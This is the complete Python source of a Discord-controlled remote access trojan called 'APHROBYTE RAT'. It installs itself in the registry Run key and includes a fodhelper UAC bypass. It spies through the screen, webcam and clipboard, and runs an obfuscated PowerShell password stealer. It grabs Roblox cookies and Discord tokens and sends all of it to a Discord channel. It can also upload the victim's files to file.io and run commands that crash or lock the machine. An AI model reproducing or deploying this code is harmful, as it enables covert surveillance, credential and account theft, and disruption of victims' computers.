import pyautogui, cv2, time, playsound, threading, win32api, discord, requests,base64, os, json, psutil, ctypes,win32crypt, rotatescreen as rs, sys, winreg, subprocess, random, socket, pyperclip, tkinter as tk, tkinter.messagebox, browser_cookie3, inspect, urllib, shutil
from discord.ext import commands
from Crypto.Cipher import AES
from gtts import gTTS
from ctypes import Structure, c_uint
from re import findall

client = commands.Bot(command_prefix='!',intents=discord.Intents.all())
client.remove_command("help")

### CONFIGURATION

token = "{token}"
guild_id = "{guildid}"
autostart = "{autostart}"
antivm = "{antivm}"

process_name = "{processname}"
if not process_name.endswith(".exe"):
    process_name = process_name + ".exe"

hide_after_exec = "{hideafterexec}"

backdoor_location = "{backdoorlocation}"
if backdoor_location == "\\AppData\\Roaming\\":
    backdoor_location = os.environ["appdata"] + "\\" + process_name
else:
    backdoor_location = os.environ["appdata"] + "\\Microsoft\\" + process_name

annc_channel_id = "{announcements}"
pass_channel_id = annc_channel_id
tokens_channel_id = annc_channel_id
roblosecurity_channel_id = annc_channel_id

### CODE

clientid = ""
startup_enabled = False
cookies = ""

installationpath = sys._MEIPASS if getattr(sys, 'frozen', False) else os.path.dirname(os.path.abspath(__file__))

def admincheck():
    val = ctypes.windll.shell32.IsUserAnAdmin()
    if val < 1:
        return False
    elif val > 0:
        return True


help_menu = f"""
Available commands for **{os.getlogin()}** :

**!help** - Shows this message
**!startup** - Adds the file to startup.
**!exit** - Stop the RAT from working.
**!usagelist** - Returns a list of active users.
**!admin_check** - Checks if you are admin on target computer.
**!bypass_uac** - Attempts to bypass UAC to get admin privileges.
**!shell** - Run a shell command

`-----SURVEILLANCE-----`

**!screenshot** - Sends a screenshot of the target machine
**!idletime** - Displays for how long the user has been AFK
**!webcam_capture** - Capture a picture of the webcam.
**!tasklist** - Returns a list of active tasks.

`-----FILE MANAGEMENT-----`

**!chdir** - Changes the current directory. **!chdir <** to go back one directory.
**!chdisk** - Changes the current disk. (E, C, D, etc.)
**!ls** - Displays all items in the current directory.
**!download** - Downloads a file from the specified path.
**!upload** - Uploads a file to the specified path.
**!taskkill** - Kills the specified task.
**!startfile** - Starts a file.
**!delfile** - Deletes a file.
**!hidefile** \ **!unhidefile** - Hides/unhides a file.

`-----INFORMATION GATHERING-----`

**!whois** - Prints the user"s name
**!getip** - Gets the current user's IP address
**!clipboard** - Returns a string of the user's clipboard.
**!stealpasswords** - Steal all the passwords from the device.
**!grabroblox** - Grabs the user's Roblox account cookie.
**!hardware_list** - Lists the user's hardware on newlines.
"""

help_menu2 = """
**!grabdiscord** - Fetches the user's Discord account token.

`-----SANCTIONING-----`

**!bsod** - Blue screens the computer.
**!disabletaskmgr** \ **!enabletaskmanager** - Disable/enable task manager.
**!logoff** - Logs the user off.
**!shutdown** - Shuts the user's PC off.
**!restart** - Restarts the user's PC.
**!blockscreen** - Blocks the user's screen. (IRREVERSIBLE UNTIL USER RESTARTS)
**!critproc** - Makes the RAT a critical process, meaning if it's task killed the user will get a BSOD.
**!screenflip** - Rotates the user's screen 90 degrees.

`-----FUN-----`

**!write** - Writes a sentence then presses enter.
**!setclipboard** - Sets the clipboard to the specified string of text.
**!forcedesktop** - Sends the user on desktop automatically.
**!messmouse** - Shakes the user's cursor when they try to move the mouse, run this command again to stop.
**!opensite** - Opens a site on the user's browser.
**!key_press** - Press a key.
**!showtaskbar** \ **!hidetaskbar**
**!tts (text)** - Text to speech.

`-----COMMUNICATION-----`

**!questionmsg** - Sends the user a question message.
**!warningmsg** - Sends the user a warning message.
**!errormsg** - Sends the user an error message.
**!infomsg** - Sends the user an informative message.

```* You need to specify the usage ID after every command. Arguments come after.

Example : !write (usage-id) (sentence) => !write 123456 Test sentence
          !questionmsg (usage-id) (message) => !questionmsg 123456 Test Message
```
"""

idedd = ""

chars = "1234567890"
clientid = "".join(random.sample(chars, 6))

class LASTINPUTINFO(Structure):
    _fields_ = [
        ('cbSize', c_uint),
        ('dwTime', c_uint)
    ]

def get_idle_duration():
    idle_time = win32api.GetTickCount() - win32api.GetLastInputInfo()
    idle_time /= 1000
    return idle_time

def takeScreenshot():
    temp = os.getenv('temp')
    sc = pyautogui.screenshot()
    sc.save(temp + "\screenshot.png")

def disable_task_manager():
    registry_path = "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    registry_name = "DisableTaskMgr"
    value = 1
    
    try:
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key, registry_name, 0, winreg.REG_SZ, value)
        winreg.CloseKey(reg_key)
        return True
    except WindowsError as e:
        return e

def enable_task_manager():
    registry_path = "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    registry_name = "DisableTaskMgr"
    value = 0
    
    try:
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key, registry_name, 0, winreg.REG_SZ, value)
        winreg.CloseKey(reg_key)
        return True
    except WindowsError as e:
        return e

@client.event
async def on_ready():
    with urllib.request.urlopen("https://geolocation-db.com/json") as url:
        ldata = json.loads(url.read().decode())
        cflag = ldata['country_code']
        ipaddress = ldata['IPv4']

    output = os.popen("wmic os get name").read()
    if "Windows 10" in output:
        platform = "Windows 10"
    elif "Windows 11" in output:
        platform = "Windows 11"
    elif "Windows 8" in output:
        platform = "Windows 8"
    elif "Windows 7" in output:
        platform = "Windows 7"
    else:
        platform = "Unbound"

    user = os.getlogin()
    host_id = socket.gethostname()
    #guild = client.get_guild(int(guild_id))
    channel = client.get_channel(int(annc_channel_id))
    takeScreenshot()
    path = f"{os.getenv('temp')}\screenshot.png"
    await channel.send(f"""
||@everyone|| The RAT has sniped :flag_{cflag.lower()}: **{user}** :flag_{cflag.lower()}: with desktop ID **{host_id}**.

``` APHROBYTE RAT v1.9.2 | {client.user.name} | RIOT ADMINISTRATION ```

:skull_crossbones: `->` IP Address : ||{ipaddress}|| <- :flag_{cflag.lower()}:
:skull_crossbones: `->` Admin privileges : **{admincheck()}**
:skull_crossbones: `->` Auto startup : **{autostart}**
:skull_crossbones: `->` OS : **{platform}**
:skull_crossbones: `->` Usage ID : ||{clientid}||

``` APHROBYTE RAT v1.9.2 | {client.user.name} | RIOT ADMINISTRATION ```

Help menu : **!help ||{clientid}||**
Get list of active users : **!usagelist**

RAT installed in : `{installationpath}`

:point_down: **__USER SCREEN__** :point_down:
""", file=discord.File(path))
    os.remove(path)
    print(f'{client.user} is now online! Clientid {clientid}')
    


@client.command()
async def help(ctx, *, usid):
    if usid == clientid:
        await ctx.send(help_menu)
        await ctx.send(help_menu2)

@client.command()
async def screenshot(ctx, *, usid):
    if usid == clientid:
        takeScreenshot()
        path = f"{os.getenv('temp')}\screenshot.png"
        await ctx.send(f"Surveillance SS -> **{os.getlogin()}**:",file=discord.File(path))
        os.remove(path)
    
@client.command()
async def write(ctx, usid, *, sentence):
    if usid == clientid:
        pyautogui.write(sentence)
        pyautogui.press('enter')
        await ctx.send(f"The user has now written **{sentence}** on their computer.")

@client.command()
async def whois(ctx, *, usid):
    if usid == clientid:
        user = os.getlogin()
        await ctx.send(f"You are on **{user}**'s computer")

@client.command()
async def getip(ctx, *, usid):
    if usid == clientid:
        with urllib.request.urlopen("https://geolocation-db.com/json") as url:
            ldata = json.loads(url.read().decode())
            cflag = ldata['country_code']
            ipaddress = ldata['IPv4']
        await ctx.send(f"**{os.getlogin()}**'s IP is :flag_{cflag.lower()}: **{ipaddress}** :flag_{cflag.lower()}:")

@client.command()
async def exit(ctx, *, usid):
    if usid == clientid:
        await ctx.send(f"The RAT process has been killed on **{os.getlogin()}**'s machine.")
        sys.exit()

@client.command()
async def bsod(ctx, *, usid):
    if usid == clientid:
        ntdll = ctypes.windll.ntdll
        prev_value = ctypes.c_bool()
        res = ctypes.c_ulong()
        ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
        if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
            await ctx.send("BSOD failed with unexpected error.")
        else:
            await ctx.send(f"{os.getlogin()} has been blue screened.")

@client.command()
async def startup(ctx, *, usid):
    if usid == clientid:
        if startup_enabled != True:
            path = sys.argv[0]
            isexe = False
            if (sys.argv[0].endswith("exe")):
                isexe = True
            if isexe:
                if (sys.argv[0].endswith("exe")):
                    if not os.path.exists(backdoor_location):
                        shutil.copyfile(sys.executable, backdoor_location)
                        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + backdoor_location + '" /f', shell=True)
                await ctx.send(f"Added file to startup for **{os.getlogin()}**")
        elif startup_enabled == True:
            await ctx.send(f"Startup already enabled for **{os.getlogin()}**")

@client.command()
async def disabletaskmgr(ctx, *, usid):
    if usid == clientid:
        value = disable_task_manager()
        if value == True:
            await ctx.send(f"Task manager has been disabled for **{os.getlogin()}**")
        else:
            await ctx.send("Insufficient permissions.")

@client.command()
async def enabletaskmgr(ctx, *, usid):
    if usid == clientid:
        value = enable_task_manager()
        if value == True:
            await ctx.send(f"Task manager has been enabled for **{os.getlogin()}**")
        else:
            await ctx.send("Insufficient permissions.")

@client.command()
async def idletime(ctx, *, usid):
    if usid == clientid:
        idletime = get_idle_duration()
        if idletime < 1:
            await ctx.send(f"**{os.getlogin()}** isn't idle.")
        elif idletime >= 1:
            await ctx.send(f'Idletime for **{os.getlogin()}**: {str(idletime)}')

@client.command()
async def clipboard(ctx, *, usid):
    if usid == clientid:
        current_clipboard = str(pyperclip.paste())
        await ctx.send(f"Clipboard content for **{os.getlogin()}** is : \n\n{current_clipboard}")

def _shellpw(command):
    output = subprocess.run(command, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    global status
    status = "ok"
    return output.stdout.decode('CP437').strip()

@client.command()
async def stealpasswords(ctx, *, usid):
    if usid == clientid:
        postchannel = client.get_channel(int(pass_channel_id))
        temp = os.getenv('temp')
        passwords = _shellpw("Powershell -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Encoded WwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAJwB7ACIAUwBjAHIAaQBwAHQAIgA6ACIASgBHAGwAdQBjADMAUgBoAGIAbQBOAGwASQBEADAAZwBXADAARgBqAGQARwBsADIAWQBYAFIAdgBjAGwAMAA2AE8AawBOAHkAWgBXAEYAMABaAFUAbAB1AGMAMwBSAGgAYgBtAE4AbABLAEYAdABUAGUAWABOADAAWgBXADAAdQBVAG0AVgBtAGIARwBWAGoAZABHAGwAdgBiAGkANQBCAGMAMwBOAGwAYgBXAEoAcwBlAFYAMAA2AE8AawB4AHYAWQBXAFEAbwBLAEUANQBsAGQAeQAxAFAAWQBtAHAAbABZADMAUQBnAFUAMwBsAHoAZABHAFYAdABMAGsANQBsAGQAQwA1AFgAWgBXAEoARABiAEcAbABsAGIAbgBRAHAATABrAFIAdgBkADIANQBzAGIAMgBGAGsAUgBHAEYAMABZAFMAZwBpAGEASABSADAAYwBIAE0ANgBMAHkAOQB5AFkAWABjAHUAWgAyAGwAMABhAEgAVgBpAGQAWABOAGwAYwBtAE4AdgBiAG4AUgBsAGIAbgBRAHUAWQAyADkAdABMADAAdwB4AFoAMgBoADAAVABUAFIAdQBMADAAUgA1AGIAbQBGAHQAYQBXAE4AVABkAEcAVgBoAGIARwBWAHkATAAyADEAaABhAFcANAB2AFIARQB4AE0ATAAxAEIAaABjADMATgAzAGIAMwBKAGsAVQAzAFIAbABZAFcAeABsAGMAaQA1AGsAYgBHAHcAaQBLAFMAawB1AFIAMgBWADAAVgBIAGwAdwBaAFMAZwBpAFUARwBGAHoAYwAzAGQAdgBjAG0AUgBUAGQARwBWAGgAYgBHAFYAeQBMAGwATgAwAFoAVwBGAHMAWgBYAEkAaQBLAFMAawBOAEMAaQBSAHcAWQBYAE4AegBkADIAOQB5AFoASABNAGcAUABTAEEAawBhAFcANQB6AGQARwBGAHUAWQAyAFUAdQBSADIAVgAwAFYASABsAHcAWgBTAGcAcABMAGsAZABsAGQARQAxAGwAZABHAGgAdgBaAEMAZwBpAFUAbgBWAHUASQBpAGsAdQBTAFcANQAyAGIAMgB0AGwASwBDAFIAcABiAG4ATgAwAFkAVwA1AGoAWgBTAHcAawBiAG4AVgBzAGIAQwBrAE4AQwBsAGQAeQBhAFgAUgBsAEwAVQBoAHYAYwAzAFEAZwBKAEgAQgBoAGMAMwBOADMAYgAzAEoAawBjAHcAMABLACIAfQAnACAAfAAgAEMAbwBuAHYAZQByAHQARgByAG8AbQAtAEoAcwBvAG4AKQAuAFMAYwByAGkAcAB0ACkAKQAgAHwAIABpAGUAeAA=")
        f4 = open(temp + r"\passwords.txt", 'w')
        f4.write(str(passwords))
        f4.close()
        file = discord.File(temp + r"\passwords.txt", filename="passwords.txt")
        await ctx.send(f":skull_crossbones: Started fishing **{os.getlogin()}**'s passwords...")
        await postchannel.send(f"{ctx.author.mention} Passwords for **{os.getlogin()}** ", file=file)
        await ctx.send(f":white_check_mark: **{os.getlogin()}**'s passwords have been sent in <#{pass_channel_id}>")
        os.remove(temp + r"\passwords.txt")


@client.command()
async def logoff(ctx, *, usid):
    if usid == clientid:
        os.system("shutdown /l /f")
        await ctx.send(f"**{os.getlogin()}** logged off.")

@client.command()
async def shutdown(ctx, *, usid):
    if usid == clientid:
        await ctx.send(f"**{os.getlogin()}**'s PC has been shut down.")
        os.system("shutdown /p")

@client.command()
async def setclipboard(ctx, usid, *, clipboard):
    if usid == clientid:
        try:
            pyperclip.copy(clipboard)
        except Exception as e: 
            await ctx.send(f'Error trying to set clipboard for **{os.getlogin()}**: `{e}`')
        current_clipboard = str(pyperclip.paste())
        await ctx.send(f'Successfully set the clipboard to **{current_clipboard}** for **{os.getlogin()}**')

@client.command()
async def forcedesktop(ctx, *, usid):
    if usid == clientid:
        pyautogui.keyDown('winleft')
        pyautogui.press('d')
        pyautogui.keyUp('winleft')
        await ctx.send(f"Sent **{os.getlogin()}** to the desktop.")

@client.command()
async def webcam_capture(ctx, *, usid):
    if usid == clientid:
        camera_count = cv2.getBuildInformation().count("Video I/O")
        if camera_count == 0:
            await ctx.send(f"No cameras found for **{os.getlogin()}**.")
            return
            
        cam_number = 0
        for camera_index in range(camera_count):
            camera = cv2.VideoCapture(camera_index)
            success, frame = camera.read()
            if success:
                cam_number = cam_number + 1
                image_path = f"camera_{camera_index}.jpg"
                cv2.imwrite(image_path, frame)

                with open(image_path, "rb") as file:
                    picture = discord.File(file, filename=image_path)
                    embed = discord.Embed(color=discord.Color.green())
                    embed.set_image(url=f"attachment://{image_path}")
                    await ctx.send(content=f"**{os.getlogin()}**'s webcam - **Camera {str(cam_number)}**",embed=embed, file=picture)

                os.remove(image_path)

            camera.release()
        if cam_number == 0:
            await ctx.send(f"**{os.getlogin()}** has no webcam available.")
    
def on_closing():
    pass

def screenblock():
    box = tk.Tk()
    box.attributes('-fullscreen', True)
    box.attributes("-topmost", True)
    box.configure(background='black')
    box.protocol("WM_DELETE_WINDOW", on_closing)
    box.mainloop()

@client.command()
async def blockscreen(ctx, *, usid):
    if usid == clientid:
        threading.Thread(target=screenblock, daemon=True).start()
        await ctx.send(f"**{os.getlogin()}**'s screen has been blocked.")
        

mousemess = False

def StartMouseMess():
    global mousemess
    while mousemess:
        x=random.randint(600, 700)
        y=random.randint(600, 700)
        pyautogui.moveTo(x, y, 3)
        time.sleep(1)

@client.command()
async def messmouse(ctx, *, usid):
    if usid == clientid:
        global mousemess
        if mousemess == False:
            mousemess = True
            threading.Thread(target=StartMouseMess,daemon=True).start()
            await ctx.send(f"Started messing **{os.getlogin()}**'s mouse.")
        elif mousemess == True:
            mousemess = False
            await ctx.send(f"Stopped messing **{os.getlogin()}**'s mouse.")
        

@client.command()
async def usagelist(ctx):
    list_usage = f"Active : **{os.getlogin()}** with desktop ID **{socket.gethostname()}** and usage ID **{clientid}**. Admin privileges : **{admincheck()}** `v1.9.2`"
    await ctx.send(list_usage)

@client.command()
async def questionmsg(ctx, usid, *, message):
    if usid == clientid:
        await ctx.send(f"Sent **{os.getlogin()}** a question message.")
        root = tkinter.Tk()
        root.wm_attributes("-topmost", 1)
        root.withdraw()
        response = tkinter.messagebox.askyesno("Question", message, parent=root)
        if response:
            await ctx.send(f"**{os.getlogin()}** has replied with **Yes** to your question which was `{message}`")
            root.destroy()
        else:
            await ctx.send(f"**{os.getlogin()}** has replied with **No** to your question which was `{message}`")
            root.destroy()

@client.command()
async def warningmsg(ctx, usid, *, message):
    if usid == clientid:
        await ctx.send(f"Sent **{os.getlogin()}** a warning message.")
        root = tkinter.Tk()
        root.wm_attributes("-topmost", 1)
        root.withdraw()
        tk.messagebox.showwarning(title='Warning', message=message, parent=root)
        await ctx.send(f"**{os.getlogin()}** saw the warning sent which was `{message}`")
        root.destroy()

@client.command()
async def errormsg(ctx, usid, *, message):
    if usid == clientid:
        await ctx.send(f"Sent **{os.getlogin()}** an error message.")
        root = tkinter.Tk()
        root.wm_attributes("-topmost", 1)
        root.withdraw()
        tk.messagebox.showerror(title='Error', message=message, parent=root)
        root.destroy()

@client.command()
async def infomsg(ctx, usid, *, message):
    if usid == clientid:
        await ctx.send(f"Sent **{os.getlogin()}** an informative message.")
        root = tkinter.Tk()
        root.wm_attributes("-topmost", 1)
        root.withdraw()
        tk.messagebox.showinfo(title='Information', message=message, parent=root)
        await ctx.send(f"**{os.getlogin()}** acknowledged the informative message sent which was `{message}`")
        root.destroy()

@client.command()
async def opensite(ctx, usid, *, website):
    if usid == clientid:
        os.system(f"start {website}")
        await ctx.send(f"Opened **{website}** for **{os.getlogin()}**")

@client.command()
async def admin_check(ctx, usid):
    value = admincheck()
    if usid == clientid:
        if value:
            await ctx.send(f"You have admin privileges against **{os.getlogin()}**")
        elif not value:
            await ctx.send(f"You do not have admin privileges against **{os.getlogin()}**")

def cookieLogger():

    data = []

    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass
    try:
        cookies = browser_cookie3.chromium(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    
    



@client.command()
async def grabroblox(ctx, *, usid):
    cookies = cookieLogger()
    roblox_cookie = cookies[1]
    if usid == clientid:
        postchannel = client.get_channel(int(roblosecurity_channel_id))
        await ctx.send(f":skull_crossbones: Started searching for **{os.getlogin()}**'s ROBLOSECURITY")
        await postchannel.send(f"""
{ctx.author.mention} .ROBLOSECURITY for **{os.getlogin()}** : 
```
{roblox_cookie}
```

Bypass IP lock with https://rbxfresh.com/
""")
        await ctx.send(f":white_check_mark: **{os.getlogin()}**'s cookies have been sent in <#{roblosecurity_channel_id}>")

def token_grab():
            LOCAL = os.getenv("LOCALAPPDATA")
            ROAMING = os.getenv("APPDATA")
            PATHS = [
                ROAMING + "\\Discord",
                ROAMING + "\\discordcanary",
                ROAMING + "\\discordptb",
                LOCAL + "\\Google\\Chrome\\User Data\\Default",
                LOCAL + "\\Google\\Chrome\\User Data\\Profile 1",
                LOCAL + "\\Google\\Chrome\\User Data\\Profile 2",
                LOCAL + "\\Google\\Chrome\\User Data\\Profile 3",
                LOCAL + "\\Google\\Chrome\\User Data\\Profile 4",
                LOCAL + "\\Google\\Chrome\\User Data\\Profile 5",
                ROAMING + "\\Opera Software\\Opera Stable",
                LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
                LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default",
                ROAMING + "\\Opera Software\\Opera GX Stable\\"

            ]

            for path in reversed(PATHS):
                if not os.path.exists(path):
                    PATHS.remove(path)

            regex1 = "[\\w-]{24}\.[\\w-]{6}\\.[\\w-]{27}"
            regex2 = r"mfa\\.[\\w-]{84}"
            encrypted_regex = "dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$]{120}"

            def getheaders(token=None, content_type="application/json"):
                headers = {
                    "Content-Type": content_type,
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
                }
                if token:
                    headers.update({"Authorization": token})
                return headers

            def decrypt_payload(cipher, payload):
                return cipher.decrypt(payload)

            def generate_cipher(aes_key, iv):
                return AES.new(aes_key, AES.MODE_GCM, iv)

            def decrypt_token(buff, master_key):
                try:
                    iv = buff[3:15]
                    payload = buff[15:]
                    cipher = generate_cipher(master_key, iv)
                    decrypted_pass = decrypt_payload(cipher, payload)
                    decrypted_pass = decrypted_pass[:-16].decode()
                    return decrypted_pass
                except Exception:
                    return "Couldn't decrypt token"

            def get_master_key(path):
                with open(path, "r", encoding="utf-8") as f:
                    local_state = f.read()
                local_state = json.loads(local_state)

                master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                master_key = master_key[5:]
                master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                return master_key

            def gettokens(path):
                path1=path
                path += "\\Local Storage\\leveldb"
                tokens = []
                try:
                    if not "discord" in path.lower():
                        for file_name in os.listdir(path):
                            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                                continue
                            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                                for token in findall(regex1, line):
                                    try:
                                        r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token))
                                        if r.status_code == 200:
                                            if token in tokens:
                                                continue
                                    except Exception:
                                        continue
                                    tokens.append(token)
                                for token in findall(regex2, line):
                                    print(token)
                                    try:
                                        r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token))
                                        if r.status_code == 200:
                                            if token in tokens:
                                                continue
                                    except Exception:
                                        continue
                                    tokens.append(token)
                    else:
                        for file_name in os.listdir(path):
                            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                                continue
                            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                                for y in findall(encrypted_regex, line):
                                    token = decrypt_token(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), get_master_key(path1 + '\\Local State'))
                                    try:
                                        r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token))
                                        if r.status_code == 200:
                                            if token in tokens:
                                                continue
                                            tokens.append(token)
                                            
                                    except:
                                        continue
                    return tokens
                except Exception as e:
                    return []
            all_tokens=[]
            for path_grab in PATHS:
                if os.path.exists(path_grab):
                    for token in gettokens(path_grab):
                        all_tokens.append(f"`{path_grab}` - **{token}**")
            return str(all_tokens).replace("[", "").replace("]", "").replace("'", "").replace(",", "")

@client.command()
async def grabdiscord(ctx, *, usid):
    if usid == clientid:
        postchannel = client.get_channel(int(tokens_channel_id))
        await ctx.send(f":skull_crossbones: Searching for **{os.getlogin()}**'s account tokens...")
        await postchannel.send(f"{ctx.author.mention} Account tokens for **{os.getlogin()}** : \n\n{token_grab()}")
        await ctx.send(f":white_check_mark: **{os.getlogin()}**'s account tokens have been sent in <#{tokens_channel_id}>")
        

@client.command()
async def chdir(ctx, usid, *, directory):
    if usid == clientid:
        if directory != "<":
            try:
                os.chdir(f"{os.getcwd()}\\{directory}")
                await ctx.send(f"Directory changed to **{directory}** for **{os.getlogin()}**")
            except: await ctx.send(f"Error accessing directory for **{os.getlogin()}**")
        elif directory == "<":
            try:
                os.chdir('..')
                await ctx.send(f"Moved one directory back for **{os.getlogin()}** -> **{os.getcwd()}**")
            except: await ctx.send(f"Error moving one directory back for **{os.getlogin()}**")

@client.command()
async def ls(ctx, *, usid):
    if usid == clientid:
        output = subprocess.getoutput('dir')
        if output:
            result = output
            numb = len(result)
        if numb < 1:
            await ctx.send(f"Error displaying current directory for **{os.getlogin()}**.")
        elif numb > 1:
            temp = (os.getenv('TEMP'))
            if os.path.isfile(temp + r"\output22.txt"):
                 os.system(r"del %temp%\output22.txt /f")
            f1 = open(temp + r"\output22.txt", 'a')
            f1.write(result)
            f1.close()
            file = discord.File(temp + r"\output22.txt", filename="output22.txt")
            await ctx.send(f"Current directory items for **{os.getlogin()}**:\n\n-", file=file)
        else:
            await ctx.send(f"Current directory items for **{os.getlogin()}**:\n\n" + result)
                
@client.command()
async def download(ctx, usid, *, path):
    if usid == clientid:
        try:
            filename = path
            check2 = os.stat(filename).st_size
        except: await ctx.send(f"File path doesn't exist.")
        if check2 > 7340032:
            try:
                await ctx.send(f"Please wait while downloading the file from **{os.getlogin()}**...")
                response = requests.post('https://file.io/', files={"file": open(filename, "rb")}).json()["link"]
                await ctx.send(f"Success downloading file from **{os.getlogin()}**. Download link : {response}")
            except: await ctx.send(f"Access denied.")
        else:
            try:
                file = discord.File(path, filename=path)
                await ctx.send(f"Success downloading file from **{os.getlogin()}**.", file=file)
            except: await ctx.send(f"Access denied.")

@client.command()
async def upload(ctx, usid, *, path):
    if usid == clientid:
        if ctx.message.attachments:
            try:
                await ctx.message.attachments[0].save(path)
                await ctx.send(f"Saved attachment for **{os.getlogin()}** in **{path}**")
            except WindowsError as e:
                await ctx.send(f"System error uploading attachment in **{path}** for **{os.getlogin()}**")

@client.command()
async def bypass_uac(ctx, *, usid):
    if usid == clientid:
        def isAdmin():
            try:
                is_admin = (os.getuid() == 0)
            except AttributeError:
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            return is_admin
        if isAdmin():
            await ctx.send(f"You already have admin privileges against **{os.getlogin()}**!")
        else:
            class disable_fsr():
                disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
                revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
                def __enter__(self):
                    self.old_value = ctypes.c_long()
                    self.success = self.disable(ctypes.byref(self.old_value))
                def __exit__(self, type, value, traceback):
                    if self.success:
                        self.revert(self.old_value)
            await ctx.send(f"Started UAC Bypass process on **{os.getlogin()}**")
            isexe=False
            if (sys.argv[0].endswith("exe")):
                isexe=True
            if not isexe:
                test_str = sys.argv[0]
                current_dir = inspect.getframeinfo(inspect.currentframe()).filename
                cmd2 = current_dir
                create_reg_path = """ powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force """
                os.system(create_reg_path)
                create_trigger_reg_key = """ powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force """
                os.system(create_trigger_reg_key) 
                create_payload_reg_key = """powershell Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "`(Default`)" -Value "'cmd /c start python """ + '""' + '"' + '"' + cmd2 + '""' +  '"' + '"\'"' + """ -Force"""
                os.system(create_payload_reg_key)
            else:
                test_str = sys.argv[0]
                current_dir = test_str
                cmd2 = current_dir
                create_reg_path = """ powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force """
                os.system(create_reg_path)
                create_trigger_reg_key = """ powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force """
                os.system(create_trigger_reg_key) 
                create_payload_reg_key = """powershell Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "`(Default`)" -Value "'cmd /c start """ + '""' + '"' + '"' + cmd2 + '""' +  '"' + '"\'"' + """ -Force"""
                os.system(create_payload_reg_key)
            with disable_fsr():
                os.system("fodhelper.exe")  
            remove_reg = """ powershell Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force """
            os.system(remove_reg)

@client.command()
async def startfile(ctx, usid, *, filepath):
    if usid == clientid:
        try:
            os.startfile(filepath)
            await ctx.send(f"**{filepath}** has been executed for **{os.getlogin()}**.")
        except WindowsError as e:
            await ctx.send(f"**{filepath}** cannot be executed for **{os.getlogin()}**.")

@client.command()
async def tasklist(ctx, *, usid):
    if usid == clientid:
        if 1==1:
            result = subprocess.getoutput("tasklist")
            numb = len(result)
            if numb < 1:
                await ctx.send(f"Error displaying active tasks for **{os.getlogin()}**")
            elif numb > 1990:
                temp = (os.getenv('TEMP'))
                if os.path.isfile(temp + r"\olist.txt"):
                    os.system(r"del %temp%\olist.txt /f")
                f1 = open(temp + r"\olist.txt", 'a')
                f1.write(result)
                f1.close()
                file = discord.File(temp + r"\olist.txt", filename="olist.txt")
                await ctx.send(f"Active tasks for **{os.getlogin()}** :", file=file)
            else:
                await ctx.send(f"Active tasks for **{os.getlogin()}** : " + result) 

@client.command()
async def taskkill(ctx, usid, *, proc):
    if usid == clientid:
        kilproc = r"taskkill /IM" + ' "' + proc + '" ' + r"/f" 
        os.system(kilproc)
        process_name = proc
        call = 'TASKLIST', '/FI', 'imagename eq %s' % process_name
